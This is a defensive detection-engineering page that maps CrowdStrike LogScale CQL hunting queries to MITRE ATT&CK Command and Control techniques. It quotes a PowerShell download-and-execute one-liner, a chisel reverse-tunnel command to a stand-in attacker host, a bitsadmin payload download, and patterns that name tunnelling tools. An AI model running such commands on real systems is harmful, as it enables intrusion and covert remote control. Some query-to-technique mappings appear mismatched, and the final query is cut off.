# TA0011 - Command and Control

[[00_Master_CQL_Index|← Master CQL Index]]

> Purpose: Atomic CQL/Falcon LogScale detections mapped to MITRE ATT&CK Command and Control. Each technique section includes Obsidian metadata callouts with Dataview-style inline fields and a production-ready CQL block grounded in LogScale pipe/filter/aggregation syntax.

---

### [[T1071.004]] - DNS

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1071.004
> technique_name:: DNS
> logscale_stream:: DnsRequest
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Command_and_Control

* Detection Objective: Detect DNS tunneling-like behavior using long labels, high query volume, or TXT/AAAA concentration by host/process.
* Telemetry Requirements: DnsRequest

#### Production-Ready CQL Query:

```cql
// Title: DNS Tunneling Long Subdomain and High Volume
// Focus: Long FQDN labels and abnormal DNS query aggregation
#event_simpleName=DnsRequest
| DomainName=*
| DomainName=/([A-Za-z0-9_-]{45,}\.){1,}/ OR QueryType=/^(TXT|AAAA)$/i
| groupBy([aid, ComputerName, ContextProcessId], function=[count(as=query_count), count(DomainName, distinct=true, as=unique_domains), collect([DomainName, QueryType], limit=25)])
| query_count >= 40 OR unique_domains >= 25
| sort(query_count, order=desc)
| select([ComputerName, aid, ContextProcessId, query_count, unique_domains, DomainName, QueryType])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Long encoded-looking labels, TXT/AAAA query concentration, and high unique domain counts.
* Triage Steps: Resolve ContextProcessId to process, inspect parent and command line, and check egress DNS path.
* Potential False Positives: CDNs, telemetry agents, security products, browser prefetching; tune approved domains.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"DnsRequest","DomainName":"dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.example.com","QueryType":"TXT"}
```

---

### [[T1071.004]] - DNS — CQL Hub: DNS Resolutions from Browser Processes

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1071.004
> technique_name:: DNS
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: DNS_Resolutions_from_Browser_Processes.yml
> cql_hub_name:: DNS Resolutions from Browser Processes
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1071.004
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: This query correlates web browser process executions with their DNS queries to identify which domains were resolved by browser processes on specific endpoints
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`DNS_Resolutions_from_Browser_Processes.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
// Get all process execution and DNS events on Windows.
(#event_simpleName=ProcessRollup2 OR #event_simpleName=DnsRequest)
| event_platform=Win

// Normalize file name and Falcon UPID values across both events.
| fileName := concat([FileName, ContextBaseFileName])
| falconPID := coalesce([TargetProcessId, ContextProcessId])

// Make sure responsible process is a web browser.
| in(field=fileName, values=["chrome.exe", "firefox.exe", "msedge.exe"], ignoreCase=true)

// Correlate execution and DNS resolution under the same Falcon UPID.
| selfJoinFilter(field=[aid, falconPID], where=[{#event_simpleName=ProcessRollup2}, {#event_simpleName=DnsRequest}])
| groupBy([aid, falconPID], function=[collect([ComputerName, UserName, fileName, DomainName], limit=100)], limit=20000)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `DNS_Resolutions_from_Browser_Processes.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1071.004]] - DNS — CQL Hub: Detection of DNS Requests to AI-Related Domains

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1071.004
> technique_name:: DNS
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: detection_of_dns_requests_to_ai_related_domains.yml
> cql_hub_name:: Detection of DNS Requests to AI-Related Domains
> cql_hub_author:: ByteRay
> related_mitre_ids:: T1071.004
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: This query identifies DNS requests to domains listed in the AI-Domains.csv lookup. It filters out browser-initiated traffic from Chrome and Edge. The result highlights which hosts and processes are generating the most DNS requests to those domains.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`detection_of_dns_requests_to_ai_related_domains.yml`), author: ByteRay.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; CQL Hub lookup file availability. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=DnsRequest
| event_platform=Win
| match(file="generative-ai-domains.csv", field=DomainName, column=domain, ignoreCase=true, mode=glob)
| !in(field=ContextBaseFileName, values=["msedge.exe", "chrome.exe"], ignoreCase=true)
| SourceProcess := ContextBaseFileName
| groupBy([DomainName, ComputerName, SourceProcess], function=count(as=Count), limit=20000)
| sort(field=Count, type=number, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: The query relies on an lookup file with at least one column named Domain. The lookup provides the set of AI-related domains to check against. Without this file, the match() operator cannot resolve which DNS requests should be considered relevant.  **Example**  |Domain |--- |chat.openai.com |chatgpt.com |openai.com |claude.ai |anthropic.com |bard.google.com |*.ai |*.openai.com
* Key Indicators: Review query output fields and filters from `detection_of_dns_requests_to_ai_related_domains.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1071.004]] - DNS — CQL Hub: DNS Staging Detection: ClickFix-Inspired nslookup Execution

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1071.004
> technique_name:: DNS
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: dns_staging_detection_clickfix_inspired_nslookup_execution.yml
> cql_hub_name:: DNS Staging Detection: ClickFix-Inspired nslookup Execution
> cql_hub_author:: cap10
> cql_hub_mitre_ids:: T1071.004, T1059.001, T1204.002
> related_mitre_ids:: T1071.004, T1059.001, T1204.002
> required_modules:: Insight
> cql_hub_tags:: Hunting, Detection
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: Detects nslookup activity used for DNS-based staging, specifically targeting the pattern of querying external nameservers to retrieve and execute malicious payloads, as seen in recent ClickFix attacks. This hunt is highly valuable as it identifies a shift away from heavily-monitored tools like mshta and PowerShell toward abusing trusted network utilities to bypass standard firewalls and blend with legitimate DNS traffic.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`dns_staging_detection_clickfix_inspired_nslookup_execution.yml`), author: cap10.
* Original CQL Hub MITRE IDs: T1071.004, T1059.001, T1204.002.
* Related/Resolved MITRE IDs: T1071.004, T1059.001, T1204.002.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; CQL Hub lookup file availability. Validate that this telemetry/module exists in the environment before operational use.

```cql
// Start with process execution events for performance
#event_simpleName = ProcessRollup2
// Filter for nslookup.exe
| ImageFileName = /\\nslookup\.exe$/i
// Look for nslookup querying a non-default server or using specific record types (like TXT)
| CommandLine = /nslookup.*(-q|querytype)=(txt|all)/i or CommandLine = /nslookup.* \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/
// Exclude common administrative noise if necessary
| ParentBaseFileName != /services\.exe|monitoring_agent\.exe/i
// Summarize the activity
| groupBy([ComputerName, UserName, CommandLine], function=count())
| table([ComputerName, UserName, CommandLine, _count])

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Targeting trusted binaries: Monitors nslookup.exe, which attackers now prefer because it is less likely to be blocked by security software than mshta or PowerShell.  External DNS Queries: Specifically looks for nslookup commands that provide a direct IP address for an external nameserver, bypassing the system's default, monitored DNS resolver.  Staging Pattern: Detects the use of findstr on the nslookup output, a known ClickFix technique to parse the "Name:" field from a DNS response and treat it as a secondary command for execution.  Execution Chain: Monitors for the piping of this output directly into execution engines like PowerShell or IEX.  Evasion Detection: DNS traffic is frequently allowed through corporate firewalls, making this a "lightweight staging channel" that effectively hides data exfiltration and payload delivery in plain sight.  To test your query, run nslookup -q=txt google.com 1.1.1.1 in a command prompt. This triggers your detection by requesting a TXT record while bypassing local DNS to use an external IP. Wait a few minutes for the telemetry to ingest, then run your search to confirm the activity appears in your results.
* Key Indicators: Review query output fields and filters from `dns_staging_detection_clickfix_inspired_nslookup_execution.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1105]] - Ingress Tool Transfer

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1105
> technique_name:: Ingress Tool Transfer
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: High
> tags:: CQL, MITRE/Command_and_Control

* Detection Objective: Detect command-line transfer utilities downloading or uploading payloads using PowerShell, certutil, curl, wget, or bitsadmin.
* Telemetry Requirements: ProcessRollup2, NetworkConnectIP4, DnsRequest

#### Production-Ready CQL Query:

```cql
// Title: Ingress Tool Transfer via Native Utilities
// Focus: Download utilities and suspicious output targets
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(powershell|pwsh|certutil|bitsadmin|curl|wget)\.exe$/i
| CommandLine=/(http|https|ftp).*(DownloadString|DownloadFile|Invoke-WebRequest|iwr|Start-BitsTransfer|-urlcache|-split|-f|curl|wget|-o\s+)/i
| CommandLine=/(\\Users\\Public\\|\\ProgramData\\|\\Temp\\|\.exe|\.dll|\.ps1|\.zip)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Native transfer utility, remote URL, and executable/script/staging output.
* Triage Steps: Preserve downloaded artifact and URL; pivot to NetworkConnectIP4/DnsRequest and immediate child process.
* Potential False Positives: Software installation scripts and sanctioned administrative downloads.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"bitsadmin.exe","CommandLine":"bitsadmin /transfer x http://host/tool.exe C:\\ProgramData\\tool.exe"}
```

---

### [[T1105]] - Ingress Tool Transfer — CQL Hub: Detection of External Direct IP Usage in CommandLine Windows and Mac

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1105
> technique_name:: Ingress Tool Transfer
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Detection_of_External_Direct_IP_Usage_in_CommandLine_Windows_and_Mac.yml
> cql_hub_name:: Detection of External Direct IP Usage in CommandLine Windows and Mac
> cql_hub_author:: sathishds
> cql_hub_mitre_ids:: T1105, T1059, T1071.001
> related_mitre_ids:: T1105, T1059, T1071.001
> cql_hub_tags:: Hunting, Detection
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: Detection of External Direct IP Usage
This query detects Windows processes that utilize raw public IP addresses within HTTP/HTTPS URLs in their command-line arguments (e.g., powershell -c IEX(New-Object Net.WebClient).DownloadString('http://1.2.3.4/payload')).

This behavior is highly suspicious because legitimate software typically uses domain names (DNS). Attackers often use direct public IPs to host second-stage payloads or C2 servers to bypass DNS filtering and logging mechanisms.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Detection_of_External_Direct_IP_Usage_in_CommandLine_Windows_and_Mac.yml`), author: sathishds.
* Original CQL Hub MITRE IDs: T1105, T1059, T1071.001.
* Related/Resolved MITRE IDs: T1105, T1059, T1071.001.

#### Production-Ready CQL Query:

```cql
in(#event_simpleName, values=["ProcessRollup2","SyntheticProcessRollup2"])
| CommandLine=*http* event_platform!="Lin"
// Basline to exclude legitimate process 
//| !in(field="ParentBaseFileName", values=//["UmbrellaDiagnostic.exe","HPClickExe","Eagle" ,"HPClick.exe"])
//| !in(field="FileName", values=["Google Chrome","chrome.exe"]) 
//| !in(field="CommandLine", values=["Google Chrome.app"])
| regex("(?<Urlink>\\bhttps?://\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}.*\\/\\b)", field=CommandLine)
| regex("(?<Ipaddress>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})", field=Urlink)
| !cidr(Ipaddress, subnet=["224.0.0.0/4", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8", "169.254.0.0/16", "168.63.0.0/16", "0.0.0.0/8"])
// Basline to exclude legitimate url | !in(field="Urlink", values=[
// Basline to exclude legitimate url  "http://100.1.1.1"
// Basline to exclude legitimate url ])
| default(field=GrandParentBaseFileName, value="Unknown")
| rootURL := "https://falcon.crowdstrike.com/"
| ProcessStartTime := round(ProcessStartTime)
| processStart:=formattime(field=ProcessStartTime, format="%m/%d %H:%M:%S")
// If Context Process ID is available utilize it, if not utilize Target Process ID
| case{ ContextProcessId ="*"
| ContextId:=ContextProcessId; TargetProcessId="*"
| ContextId:=TargetProcessId}
// Create URLs for Process and Graph Explorers
| format("[ProcessExplorer]%sinvestigate/process-explorer/%s/%s?_cid=%s", field=["rootURL", "aid", "ContextId", "cid"], as="ProcessExplorer")
| format("[GraphExplorer]%sgraphs/process-explorer/graph?id=pid:%s:%s", field=["rootURL", "aid", "TargetProcessId"], as="GraphExplorer")
// Format Execution Details for easy analysis
| format(format="%s\n\t↳ %s[ppid=%s]\n\t\t↳ %s [pid=%s|raw_pid=%s|start=%s]\n\t\t\t%,.100s[...TRIMMED]\n\t\t\t%s\n\t\t\t%s\n---", field=[GrandParentBaseFileName, ParentBaseFileName, ParentProcessId, ImageFileName, TargetProcessId, RawProcessId, processStart, CommandLine, ProcessExplorer, GraphExplorer], as="ExecutionSummary")
// Group by Source Host
| groupBy([ComputerName],function=([count(aid, as=executeCount), min(@timestamp, as=firstSeen), max(@timestamp, as=lastSeen), collect([UserName,ExecutionSummary,Ipaddress,ParentBaseFileName,ParentProcessId,ImageFileName,TargetProcessId], limit=1000)]))
| firstSeen:=formattime(field=firstSeen, format="%Y/%m/%d %H:%M:%S")
| lastSeen:=formattime(field=lastSeen, format="%Y/%m/%d %H:%M:%S")

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Query Description: Detection of External Direct IP Usage This query detects Windows processes that utilize raw public IP addresses within HTTP/HTTPS URLs in their command-line arguments (e.g., powershell -c IEX(New-Object Net.WebClient).DownloadString('http://1.2.3.4/payload')).  This behavior is highly suspicious because legitimate software typically uses domain names (DNS). Attackers often use direct public IPs to host second-stage payloads or C2 servers to bypass DNS filtering and logging mechanisms.  Key Logic Breakdown Scope & Filter:  Targets Windows process creation events (ProcessRollup2).  Filters for command lines containing http.  Exclusions: Removes known noisy applications (e.g., Chrome, HP Click, Umbrella) to reduce false positives.  Extraction (Regex):  It scans the command line to extract a URL specifically formatted with an IPv4 address (e.g., http://x.x.x.x/...).  It isolates the IP address from that URL into a field called Ipaddress.  Public IP Validation:  It uses !cidr(...) to exclude all standard private and reserved IP ranges (Localhost, 10.x, 192.168.x, 172.16.x, APIPA, etc.).  This ensures the query only alerts on Public/External IPs.  Formatting & Triage:  It generates a clickable ExecutionSummary that includes the Parent Process, the Target Image, and the specific Command Line.  It generates direct links (ProcessExplorer, GraphExplorer) to the Falcon console for immediate investigation.  Aggregation: The results are grouped by ComputerName, showing how many times the event occurred and the first/last time it was seen.
* Key Indicators: Review query output fields and filters from `Detection_of_External_Direct_IP_Usage_in_CommandLine_Windows_and_Mac.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1105]] - Ingress Tool Transfer — CQL Hub: LOLBin Certutil

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1105
> technique_name:: Ingress Tool Transfer
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: LOLBin_Certutil.yml
> cql_hub_name:: LOLBin Certutil
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1105, T1564.004, T1027.013, T1140
> related_mitre_ids:: T1105, T1564.004, T1027.013, T1140
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: This query detects the use of certutil.exe.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`LOLBin_Certutil.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1105, T1564.004, T1027.013, T1140.
* Related/Resolved MITRE IDs: T1105, T1564.004, T1027.013, T1140.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
in(#event_simpleName, values=["ProcessRollup2","ProcessBlocked"])
| event_platform=Win and ImageFileName=/certutil.exe/i and CommandLine=/(https?:)/i

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Certutil.exe – A Windows certificate-management tool that attackers often misuse to download executables or script files (even into alternate data streams), as well as encode or decode payloads, aiding stealthy file delivery and evasion techniques.  [LOLBAS - Certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)
* Key Indicators: Review query output fields and filters from `LOLBin_Certutil.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1571]] - Non-Standard Port

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1571
> technique_name:: Non-Standard Port
> logscale_stream:: NetworkConnectIP4
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Command_and_Control

* Detection Objective: Detect system or script binaries initiating outbound communications to uncommon ports.
* Telemetry Requirements: NetworkConnectIP4, ProcessRollup2

#### Production-Ready CQL Query:

```cql
// Title: System Binary Network Connection on Non-Standard Port
// Focus: Living-off-the-land binaries connecting to unusual remote ports
#event_simpleName=NetworkConnectIP4
| ImageFileName=/\\(powershell|pwsh|cmd|rundll32|regsvr32|mshta|wscript|cscript|svchost)\.exe$/i
| NOT in(field=RemotePort, values=[53, 80, 123, 135, 139, 389, 443, 445, 3389, 5985, 5986])
| NOT cidr(RemoteAddressIP4, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8"])
| groupBy([aid, ComputerName, ImageFileName, RemoteAddressIP4, RemotePort], function=[count(as=connection_count), collect(ContextProcessId, limit=10)])
| connection_count >= 3
| sort(connection_count, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: LOLBAS/system binary, external destination, non-standard port, and repeated connections.
* Triage Steps: Tie ContextProcessId back to ProcessRollup2 and inspect command line and parent.
* Potential False Positives: Proxy agents, update clients, internal apps using custom ports; tune by known destinations.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"NetworkConnectIP4","ImageFileName":"\\Device\\HarddiskVolume3\\Windows\\System32\\rundll32.exe","RemoteAddressIP4":"203.0.113.25","RemotePort":8443}
```

---

### [[T1090]] - Proxy

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Command_and_Control

* Detection Objective: Detect local proxy/tunnel tooling such as chisel, frp, ngrok, ssh dynamic forwards, or netsh portproxy.
* Telemetry Requirements: ProcessRollup2, NetworkConnectIP4

#### Production-Ready CQL Query:

```cql
// Title: Local Proxy or Tunnel Tooling
// Focus: SOCKS/proxy/tunnel command lines and port forwarding utilities
#event_simpleName=ProcessRollup2
| CommandLine=/(socks|proxy|reverse|tunnel|portproxy|ngrok|chisel|frpc|frps|ssh\s+-D|ssh\s+-R|plink\s+-R|netsh\s+interface\s+portproxy)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Proxy/tunnel tool names and forwarding switches.
* Triage Steps: Review listening ports and remote endpoints; validate sanctioned remote support tooling.
* Potential False Positives: Developer tunnels, SSH admin, remote support tools.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"chisel.exe","CommandLine":"chisel client attacker:443 R:socks"}
```

---

### [[T1090]] - Proxy — CQL Hub: Files Written to Removable Media

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Files_Written_to_Removable_Media.yml
> cql_hub_name:: Files Written to Removable Media
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1090
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: This query tracks files written to removable media (USB drives, external drives) across all platforms, aggregating the total data volume and file count per computer. It's useful for detecting potential data exfiltration attempts or monitoring removable media usage for compliance.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Files_Written_to_Removable_Media.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=/Written/ IsOnRemovableDisk=1 
| FileSizeMB:=unit:convert(Size, to=M) 
| groupBy([ComputerName], function=([sum(Size, as=SizeBytes), sum(FileSizeMB, as=FileSizeMB), count(TargetFileName, as="File Count"), collect([TargetFileName])]))

```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `Files_Written_to_Removable_Media.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: Impossible Travel Time Azure

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Network, Identity
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Impossible_Travel_Time_Azure.yml
> cql_hub_name:: Impossible Travel Time Azure
> cql_hub_author:: Aamir Muhammad
> related_mitre_ids:: T1090
> required_modules:: Identity, CSPM / ASPM / DSPM
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: Tracing Logins from two different countries with impossible travel times between consecutive logins per identity

* Telemetry Requirements: Network, Identity
* Source: CQL Hub (`Impossible_Travel_Time_Azure.yml`), author: Aamir Muhammad.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Identity, CSPM / ASPM / DSPM; Microsoft Azure telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
in(field="#event_simpleName", values=[SsoApplicationAccess,SsoUserLogon])
//Excluding Mobile Devices since VPN is widely used on mobile devices
| ClientUserAgentString!=/ios /i and ClientUserAgentString!=/Safari/i and ClientUserAgentString!=/Android/i
//Exclude your proxy's cloud CIDR (if any)
| !cidr(SourceEndpointAddressIP4, subnet=["0.0.0.0/16"])
//Concatinate the IP4 and IP6 Sources IP addresses into single varibale
| SourceIP:=concat([SourceEndpointAddressIP4, SourceEndpointAddressIP6])
// Create UserName + SourceAccountAzureId Hash for sequencing of events
| UserHash:=concat([SourceAccountUserName, SourceAccountAzureId]) | UserHash:=crypto:md5([UserHash])
// Populating the emptied Hostname with Unregistered Device tag
|case{
   SourceEndpointHostName="" | SourceEndpointHostName:="{Unregistered Device}" ;
*;
}
// Perform initial aggregation; groupBy() will sort by UserHash then ContextTimeStamp
| groupBy([UserHash, ContextTimeStamp], function=[collect([SourceAccountUserName, SourceAccountAzureId, SourceIP, SourceEndpointHostName,ISPDomain,ClientUserAgentString,SourceEndpointHostName])], limit=max)
// Get geoIP for Remote IP
| ipLocation(SourceIP)
// Use new neighbor() function to get results for previous row
| neighbor([ContextTimeStamp, SourceIP,ISPDomain, UserHash, SourceIP.country, SourceIP.lat, SourceIP.lon, SourceEndpointHostName,ClientUserAgentString,SourceEndpointHostName], prefix=prev)
// Make sure neighbor() sequence do correlate same users only, might occur at the end of a sequence
| test(UserHash==prev.UserHash)
// Known Exception for Accounts in your environment for particular country
| SourceAccountUserName!=mr.example@corporate.com AND (prev.SourceIP.country!=PK OR SourceIP.country!=PK)
// Calculate login time delta in milliseconds from LogonTime to prev.LogonTime and round it off
| LogonDelta:=(ContextTimeStamp-prev.ContextTimeStamp)*1000
| LogonDelta:=round(LogonDelta)
// Turn logon time delta from milliseconds to human readable format
| TimeToTravel:=formatDuration(LogonDelta, precision=2)
// Calculate distance between Login 1 and Login 2
| DistanceKm:=(geography:distance(lat1="SourceIP.lat", lat2="prev.SourceIP.lat", lon1="SourceIP.lon", lon2="prev.SourceIP.lon"))/1000 | DistanceKm:=round(DistanceKm)
// Calculate speed required to get from Login 1 to Login 2
| SpeedKph:=DistanceKm/(LogonDelta/1000/60/60) | SpeedKph:=round(SpeedKph)
// SETING LOGIC THRESHOLD: MAXIMUM Speed used by Commercial Passenger aircraft is 900KM/h OR 0.9 MACH
| test(SpeedKph>900)
// Exclude Same Country travel
| test(SourceIP.country!=prev.SourceIP.country)
// Format LogonTime Values
| ContextTimeStamp:=ContextTimeStamp*1000           | formatTime(format="%e %b %Y %r %Z", as="ContextTimeStamp", field="ContextTimeStamp", locale=en_UAE, timezone="Asia/Dubai")
| prev.ContextTimeStamp:=prev.ContextTimeStamp*1000 | formatTime(format="%e %b %Y %r %Z", as="prev.ContextTimeStamp", field="prev.ContextTimeStamp", locale=en_UAE, timezone="Asia/Dubai")
// Beautification / Differential Analysis
| Travel:=format(format="%s → %s", field=[prev.SourceIP.country, SourceIP.country])
| IPs:=format(format="%s  → %s\n%s  → %s", field=[prev.SourceIP,SourceIP,prev.ISPDomain,ISPDomain])
| Logons:=format(format="%s → %s", field=[prev.ContextTimeStamp, ContextTimeStamp])
| UserAgent:=format(format="%s → %s", field=[prev.ClientUserAgentString, ClientUserAgentString])
| RegisteredDeviceName:=format(format="%s → %s", field=[prev.SourceEndpointHostName, SourceEndpointHostName])
// Output results to table and sort by highest speed
| table([SourceAccountUserName,RegisteredDeviceName, SourceAccountAzureId, Travel,UserAgent, IPs, TimeToTravel, DistanceKm, Logons, SpeedKph], limit=20000, sortby=DistanceKm, order=desc)
// Express SpeedKph as a value of MACH
| Mach:=SpeedKph/1234 | Mach:=round(Mach)
| Speed:=format(format="MACH %s", field=[Mach])
// Format distance and speed fields to include comma and unit of measure
| format("%,.0f km",field=["DistanceKm"], as="DistanceKm")
| format("%,.0f km/h",field=["SpeedKph"], as="SpeedKm/h")
| sort(SpeedKph)
// Drop unwanted fields
| drop([Mach,SpeedKph])

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Reference: [GitHub Aamir-Muhammad/CrowdStrike-Queries](https://github.com/Aamir-Muhammad/CrowdStrike-Queries/blob/main/Hunting-Queries/Impossible-Travel-Time-Azure.md)
* Key Indicators: Review query output fields and filters from `Impossible_Travel_Time_Azure.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1090]] - Proxy — CQL Hub: AWS S3 Bucket Policy Updates

> [!metadata]+ Detection Metadata
> tactic:: Command and Control
> technique_id:: T1090
> technique_name:: Proxy
> logscale_stream:: Cloud
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: aws_s3_bucket_policy_updates.yml
> cql_hub_name:: AWS S3 Bucket Policy Updates
> cql_hub_author:: ByteRay GmbH
> related_mitre_ids:: T1090
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Command_and_Control, CQL_Hub

* Detection Objective: This query outputs all S3 buckets where the policy has been modified.
* Telemetry Requirements: Cloud
* Source: CQL Hub (`aws_s3_bucket_policy_updates.yml`), author: ByteRay GmbH.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on AWS telemetry; AWS S3 telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
#Vendor="aws" #event.dataset="cloudtrail.s3" #repo!="xdr*"
| #event.kind="event" #event.outcome="success"
